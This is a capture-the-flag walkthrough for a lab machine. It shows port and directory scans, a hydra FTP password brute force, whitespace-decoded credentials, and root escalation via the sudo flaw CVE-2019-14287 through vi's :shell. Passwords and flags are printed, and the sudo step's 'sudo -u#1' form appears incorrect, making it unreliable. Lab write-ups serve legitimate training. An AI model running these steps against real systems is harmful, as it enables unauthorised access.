@@ -1,0 +1,500 @@
+Musa Troglodytarum
+
+└─$ nmap -A -p- -T4 10.10.151.17
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 14:54 GMT
+Nmap scan report for 10.10.151.17
+Host is up (0.035s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.10 (Debian)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+└─$ feroxbuster --url http://10.10.151.17 --wordlist  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200
+                                                                                                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.151.17
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       25l      128w    10355c http://10.10.151.17/icons/openlogo-75.png
+200      GET      180l      306w     2976c http://10.10.151.17/assets/style.css
+301      GET        9l       28w      313c http://10.10.151.17/assets => http://10.10.151.17/assets/
+200      GET      189l      643w     7853c http://10.10.151.17/
+200      GET        0l        0w 52353992c http://10.10.151.17/assets/MusaTroglodytarum.mp4
+[######>-------------] - 4m    402410/1185250 7m      found:5       errors:730    
+[######>-------------] - 4m    402393/1185240 1619/s  http://10.10.151.17/ 
+
+dans le style.css : 
+
+/l3_B4n4N13r_D3s_M0nT4gN3s.php
+
+curl http://10.10.151.17/l3_B4n4N13r_D3s_M0nT4gN3s.php -vvv
+
+Nus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
+
+└─$ curl  http://10.10.151.17/l3_B4n4N13r_D3s_M0nT4gN3s.php -vvv
+16:24:17.728363 [0-x] == Info: [READ] client_reset, clear readers
+16:24:17.728407 [0-0] == Info: [SETUP] added
+16:24:17.728431 [0-0] == Info:   Trying 10.10.151.17:80...
+16:24:17.761781 [0-0] == Info: Connected to 10.10.151.17 (10.10.151.17) port 80
+16:24:17.761925 [0-0] == Info: using HTTP/1.x
+16:24:17.762106 [0-0] => Send header, 105 bytes (0x69)
+0000: GET /l3_B4n4N13r_D3s_M0nT4gN3s.php HTTP/1.1
+002d: Host: 10.10.151.17
+0041: User-Agent: curl/8.10.1
+005a: Accept: */*
+0067: 
+16:24:17.762631 [0-0] == Info: Request completely sent off
+16:24:17.796643 [0-0] <= Recv header, 20 bytes (0x14)
+0000: HTTP/1.1 302 Found
+16:24:17.796871 [0-0] == Info: [WRITE] cw_out, wrote 20 header bytes -> 20
+16:24:17.797114 [0-0] == Info: [WRITE] download_write header(type=c, blen=20) -> 0
+16:24:17.797363 [0-0] == Info: [WRITE] client_write(type=c, len=20) -> 0
+16:24:17.797576 [0-0] <= Recv header, 37 bytes (0x25)
+0000: Date: Mon, 28 Oct 2024 16:24:16 GMT
+16:24:17.797873 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=37) -> 0
+16:24:17.798130 [0-0] == Info: [WRITE] cw_out, wrote 37 header bytes -> 37
+16:24:17.798385 [0-0] == Info: [WRITE] download_write header(type=4, blen=37) -> 0
+16:24:17.798649 [0-0] == Info: [WRITE] client_write(type=4, len=37) -> 0
+16:24:17.798869 [0-0] <= Recv header, 32 bytes (0x20)
+0000: Server: Apache/2.4.10 (Debian)
+16:24:17.799149 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=32) -> 0
+16:24:17.799384 [0-0] == Info: [WRITE] cw_out, wrote 32 header bytes -> 32
+16:24:17.799597 [0-0] == Info: [WRITE] download_write header(type=4, blen=32) -> 0
+16:24:17.799838 [0-0] == Info: [WRITE] client_write(type=4, len=32) -> 0
+16:24:17.799983 [0-0] <= Recv header, 104 bytes (0x68)
+0000: Location: intermediary.php?hidden_directory=/L3s_Fru1ts_s0nt_c0N
+0040: Nus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
+16:24:17.800444 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=104) -> 0
+16:24:17.800630 [0-0] == Info: [WRITE] cw_out, wrote 104 header bytes -> 104
+16:24:17.800785 [0-0] == Info: [WRITE] download_write header(type=4, blen=104) -> 0
+16:24:17.800985 [0-0] == Info: [WRITE] client_write(type=4, len=104) -> 0
+16:24:17.801177 [0-0] <= Recv header, 19 bytes (0x13)
+0000: Content-Length: 0
+16:24:17.801327 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=19) -> 0
+16:24:17.801520 [0-0] == Info: [WRITE] cw_out, wrote 19 header bytes -> 19
+16:24:17.801663 [0-0] == Info: [WRITE] download_write header(type=4, blen=19) -> 0
+16:24:17.801828 [0-0] == Info: [WRITE] client_write(type=4, len=19) -> 0
+16:24:17.802022 [0-0] <= Recv header, 40 bytes (0x28)
+0000: Content-Type: text/html; charset=UTF-8
+16:24:17.802259 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=40) -> 0
+16:24:17.802446 [0-0] == Info: [WRITE] cw_out, wrote 40 header bytes -> 40
+16:24:17.802635 [0-0] == Info: [WRITE] download_write header(type=4, blen=40) -> 0
+16:24:17.802785 [0-0] == Info: [WRITE] client_write(type=4, len=40) -> 0
+16:24:17.802951 [0-0] <= Recv header, 2 bytes (0x2)
+0000: 
+16:24:17.803082 [0-0] == Info: [WRITE] header_collect pushed(type=1, len=2) -> 0
+16:24:17.803260 [0-0] == Info: [WRITE] cw_out, wrote 2 header bytes -> 2
+16:24:17.803409 [0-0] == Info: [WRITE] download_write header(type=4, blen=2) -> 0
+16:24:17.803571 [0-0] == Info: [WRITE] client_write(type=4, len=2) -> 0
+16:24:17.803737 [0-0] == Info: [WRITE] xfer_write_resp(len=254, eos=0) -> 0
+16:24:17.803825 [0-0] == Info: [WRITE] cw-out is notpaused
+16:24:17.803875 [0-0] == Info: [WRITE] cw-out done
+16:24:17.803906 [0-0] == Info: [READ] client_reset, clear readers
+16:24:17.803946 [0-0] == Info: Connection #0 to host 10.10.151.17 left intact
+
+download the picture && strings picture.png : 
+
+Eh, you've earned this. Username for FTP is banane_celeste
+One of these is the password:
+iVBORw0KGgoAAAANSUhE
+UgAAAUYAAAHyCAIAAAAY
+7vDEAAAu1npUWHRSYXcg
+cHJvZmlsZSB0eXBlIGV4
+aWYAAHjarZxpslw5boX/
+cxW1BE7gsByOEd6Bl+/v
+MFMqSd1td0e4VNKT3svh
+XhI4AwCmO//9X9f99ddf
+wefaXLbaSi/F81/uucfB
+X5r//Nffnzzw/fn+y+X7
+t/D7992N37/qa+Jr+vyg
+js/XMPi+/f2EH+8R5u/f
+d+37k9i+L/T9AS/8/kt6
+Z/19/3qRfD9+vh/y94X6
++fyl9FZ/vdT5faH1feC7
+lO/vuH7e3uc9+bf79Ru5
+skrbeKMU40kh+fdn+1xB
+0u+QBr/1Z0ydx4WU+XtK
+3vElpx8vxoL8dns/vnr/
+6wL9tsijfm/tz9X/+bc/
+Fj+O7/fTH2tZfrxQ+ec/
+CPbH99PPt4m/vnH6/s3x
+7d9+MFus/3A739/37nbv
++dzdyIUVLd+I8u7H6ug5
+PHCy5Ok9rfCr8tv4e32/
+Or+aH36x5dsvP/m1Qg+R
+Xbku5LDDCDec93WFxSXm
+eGLla4yLjdL3Wqqxx5U+
++8SvcGNNPe3U2L8Vj2Pr
+coo/ryW89+3v/VZovPMO
+PDQGXizwlH/5y/1vP/xP
+frl7l5Yo+PZZJ+KC64qK
+ay5DO6c/eRQbEu533+wt
+8I9f3+33v8QPocoO2lvm
+xg0OPz8vMS38HVvp7XPi
+ccbXTwoFV/f3BVgi3tu4
+GFIgB19CslCCrzHWEFjH
+xgYNrjymHCc7EMzi5iJj
+TqlEV2OLem+eU8N7bLRY
+or4NNrERlkqq7E1Pg83K
+2YifmhsxNCxZNrNi1Zqz
+bqOkkouVUmoRyI2aaq5W
+S6211V5HSy03a6XV1lpv
+o8eewEDrpdfeeu9jRDd4
+o8FrDR4/+M6MM808bZZZ
+Z5t9jkX4rLxslVVXW32N
+HXfawMQuu+62+x4nuANS
+nHzslFNPO/2MS6zddPO1
+W2697fY7fu5a+Kbtn7/+
+g10L312Lb6f0uPpz1/iu
+q/XHSwTBiWnP2LGYAzte
+tQMEdNSe+RZyjto57Znv
+kaSwyEWa9sbtoB1jC/MJ
+0W74uXd/79y/tW/O2r+1
+b/H/2jmnrfv/2DnH1v3j
+vv2TXdviufV27JOFWlOf
+yL5rO+Tj3rVMcGfsHPru
+ZmPsBXNw3d3CXnWn0Hac
+qw1fbTS/Wt4xt1lZ2NZH
+6Un/5tby2hb6LOmmXO5g
+odraCcw9KYazYh+2LrdS
+d+lsnu3Gnl5Wgh/wZEuh
+kEpup8Ji88La38o2+J16
+44U6F8AO7rzibqMqhacR
+SO3UPmJvS1+aT7wv/yyu
+CYJKPokXyz72GjJ7E/RY
+QHPHswZMShwtyyOmYbuf
+nQfLaoVHjlROGYXFbiPv
+mY9+AJf2DLBHXXAMw2rY
+rYETnfU7ZWmxum6FW2Zd
+uErdHkuhu3BcfFo7l80K
+sC2xEIoEbAqDaNmSMYtr
+L/NzH3X0vfkL9yKeEViN
+JbIabpyRTiHMyY6i19o8
+JxXYwdIMBnmclWqBAliB
+2JfnQYQT0mqAbwbdNO5o
+HKf84gKJ+5UtZR5e/STb
+9mhs/SJKVyAiZmWXeb1y
+LlvPtyyzd503mR3Ur8nl
+21tYZM5OfJ9wuTzdbMd0
+9urIqb7JOrYDHrTQIplz
+0vSnzlOvH+cudqam5e5h
+Pdg01mW3VYDp9tB6hoHE
+yXFbzrxezYNMO5EdSOyf
+Z+G48KClG9w5CEmqs9Qs
+Hss3vMROYO2XJ6sD2TGg
+J9IzmbhaK9KzKSql+nh/
+drfZQFF1F7gQwhpW50E3
+By1hB1eIuKnQ2bbObb1y
+B4MVthPCLWeSPWkO3vzw
+8n5O74jTBX6tcPLlpfdu
+k5wZXD9kzx3vSuK8yDxx
+VYtTq723lrrOmGzfWFhQ
+73IL29eTlpiKZ3fert5Q
+pykKgRt0wsntLOCCrSvz
+zpUuUarvS+AZ617rcN22
+sT/sVk1pAQPkUrTO/UZe
+D3QEkfZqdU8CwnrlDja5
+lOIZk3xDh5Z6uz9uxYl6
+yusK0izXUSHcffa0Q2C0
+McME0gZxCwmEC5J24p47
+HgG+adMIo9lJkbVqmLmA
+jev4cIBFXmsLOtA7ua+Z
+SDh+9+lzuzvXozgmlALJ
+cXkilD9YDhcGP7KybyHp
+eESc5CkarfRjRCjglrhb
+vUIhzwYLNIH7uVFld6R5
+ppcCi8OV6xHM3NSFDMK+
+SVhL3JwFOAEQcxAbM+w9
+VhGx5EG8B57SgFHu8Z7a
+YpzZjWqpT7aSLPPHdibv
+QHhCjsCFggZBiIzcSykE
+7m8i/+XLIYAbyRu4BcDL
+kcm1cLUoFOiH4FiZZ3NV
+LCQBcC1F4oh1yryRAJ63
+YMXhJ/aOdOiYErgqO0EP
+0R6rQMaTHrVtshZ0OkH6
+ce9FkO3ZeMZkHfxTn3Ve
+8OmQt6MHuwgkN3olQACu
+OlMZodZ4+4QfcTOT/xoZ
+QvZFxaTnRnyahRecJ0YS
+R9RM3sxxsiOmziFYagUE
+WDzgeVztNLcZ0uXyuDd2
+kZW1OTxUB+dtbha64mJb
+41Hbj+38Obx5qWDy8YRq
+FlTP3D0QWAg1thFQh1yh
+fsLAyuGnG9TNC3PFO09r
+Ldzh4DzSqq+zlRfrogA2
+NLlOJoFOrzmK/i1zCbgH
+62mNobvd2DtyYxt813K8
+DvxoCJZGqt3e012DOF/y
+BQ3dYKQSD4Xl+ccKui0J
+ErQDm8ed7cP1ABgrugBB
+QlBEMJlkYC6heQUPg/vv
+t9QeC9fOGudAZpMNivpE
+WFzxOBZjg1SncGssdkUN
+eXBYzMcFkyq3rmR1gT2p
+3LCgBPKlcFtkByuaSNUK
+IHtYGiqDSdCQa4dJ6BC7
++c7rO4Ao1mjEACyHJrvS
+fKIt9Gs+7AMIrNw1vM/m
+W2xiGw4piCYLme8XbgwV
+QzyT/dBagxC8Nos4Q48A
+kEf6ooZ64r7k9rDbDDgC
+KTOmZu8tPj4locV8qKPI
+S21Cn3wkCg6bz3b29qCz
+X6tii2rkzRwV+KtGHLv0
+oic+nhqk6WgANHdLlILt
+0I2dBoDpyZdNQtNgHlsP
+y8MavEdgQU6w5fa8y1AK
+3CBJc5BB5D5vB7NeJFdd
+a5JDBDEXjvyTUJCwmgeV
+2SEcNATZurMTJ8CK/QgQ
+MnILMAMWAJ8D+iVSkNvB
+Ir6ERVP2iERkC6A7CL6h
+byDksryTtCM4gb4zV9YO
+cWHGlofEAy6K46AhoVKQ
+zsOYSAjgEbvJK7QKNveF
+jbXiIiJ5Tc+VsOUIpjii
+khfms9ZPk3ItYB97GoWd
+B9k6w8EbgzIzPTE6ieHg
+QJezS/HwBC+OnoBwgM+J
+rkEJoZgaNApPQybgg0/7
+HoCabY85z5bBc4R4su5Q
+okgr0n2ikmbcA0kcpKkk
+4nndoLjqyBE0FSIDivNC
+Vy9ZRbarCAVKj+vABehn
+gPKTq8qo+MzagarcIxgO
+8Ay0CrG/FhIByuZayLm8
+0IOE1g4od4RUckCoh6kJ
+mnOR5tIZIPO4NY4hFOf7
+VeFMznGLaExrCWAaZIrv
+4ApQsDtmxYElhw1JSs+0
+0JWB5AbBQdc4h3bR53wV
+KQALv/Dka5EgpYa7eGsz
+Agub4Nq2i1FAY6OgwpEf
+wOegoqC93BPqeIa6EDkH
+DvKkF4QDWs6Nj5I+h1Ym
+0TccUZISygZpH6ryM4Ie
+C/WEpo2QOE+Frkr1PYio
+cQckPUBhyBh4mKRC58Q8
+XYNICWUCvuSkPUJMAMWs
+KdpkJK4B1mgDqOFCd4gv
+e2IWl7LvtxH0AX0mU8M9
+Qfa3HiQ7WgOVjTlEIQwI
+xYPmEDMbfdoWOJHu6EnF
+Dq+DHJFauXbksomHRDSS
+6B6M2UBNOiFff6VGTotX
+riBP1rbO0tCuRUtF4myu
+DCAvyANCADG62ZoB6CU0
+K/aQzOSlC3g+G96AjRsk
+YyAlWEvt4kKhBWxTRuCC
+h4mAbRDkuMlwQucoNI6I
+QP9D/AQDRob1Y4+0f4s/
+eSweJEe8y13Ig0pWDz0w
+dXe8Mg09rBLpYTNA5UgS
+DzFwVAWO8MtQAnYH3Cbp
+hUih4tJX2PIid89Vrosy
+vShRMhvdx7aWINq1JdCG
+YpWHeB28Q5BFw1qswBWj
+
+create a wordlist with this
+
+└─$ hydra  -l banane_celeste -P wordlist 10.10.151.17 ftp -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-28 16:36:02
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 200 login tries (l:1/p:200), ~4 tries per task
+[DATA] attacking ftp://10.10.151.17:21/
+[21][ftp] host: 10.10.151.17   login: banane_celeste   password: 4nndoLjqyBE0FSIDivNC
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-28 16:36:28
+
+get Valerian_creds.txt : 
+
+Get out, there is nothing here!$
+   	 	 	 	$
+	$
+     			  		$
+	$
+     		  	 	$
+	$
+     			  	 $
+	$
+      			 	 $
+	$
+      	     $
+	$
+     			 		 $
+	$
+     		    	$
+	$
+     		 		  $
+	$
+     		  	 	$
+	$
+     			  	 $
+	$
+     		 	  	$
+	$
+     		    	$
+	$
+     		 			 $
+	$
+        	 	 $
+	$
+     	 	    $
+	$
+     		    	$
+	$
+     			  		$
+	$
+     			  		$
+	$
+     			 			$
+	$
+     		 				$
+	$
+     			  	 $
+	$
+     		  	  $
+	$
+      			 	 $
+	$
+      	     $
+	$
+     	 	 	  $
+	$
+      		 	  $
+	$
+     		 	 		$
+	$
+     	 					$
+	$
+     			 	  $
+	$
+      		 	  $
+	$
+     		 	 		$
+	$
+     	 					$
+	$
+     	 	  		$
+	$
+      		    $
+	$
+     		 		  $
+	$
+     		 	  	$
+	$
+     		  	  $
+	$
+     		  	 	$
+	$
+     	 					$
+	$
+     	   	  $
+	$
+     				  	$
+	$
+     		 			 $
+	$
+      		    $
+	$
+     	 					$
+	$
+     		 	  	$
+	$
+     		 			 $
+	$
+     			 	  $
+	$
+      		    $
+	$
+     	 					$
+	$
+     	    		$
+	$
+     			  	 $
+	$
+      		   	$
+	$
+     		 		 	$
+	$
+     	 	    $
+	$
+  $
+$
+$
+
+https://vii5ard.github.io/whitespace/
+
+User: valerian
+Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
+
+connexion message:
+
+1 new message
+Message from Root to Gabriel:
+
+"Gabriel, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+
+END MESSAGE
+
+cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_g4br13L_0nly\! :
+
+Your password is awful, Gabriel. 
+It should be at least 60 characters long! Not just ca_serait_jamais_arrive_en_haskell
+Honestly!
+
+Yours sincerely
+   -Root
+   
+ssh gabriel@<IP>
+
+password : ca_serait_jamais_arrive_en_haskell
+
+cat user.txt : EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}
+
+sudo -l :
+
+gabriel@muso-troglodytarum:~$ sudo -l
+Matching Defaults entries for gabriel on muso-troglodytarum:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gabriel may run the following commands on muso-troglodytarum:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
+    
+This is the CVE-2019-14287, I ran sudo -u#1 /usr/bin/vi /home/gabriel/user.txt
+
+on vim I ran :shell and I got a shell as root
+
+cat root.txt : EPI{L4_t193_Fl0R1F3R3_D35_m0nt49N35_DR35533}
+
+
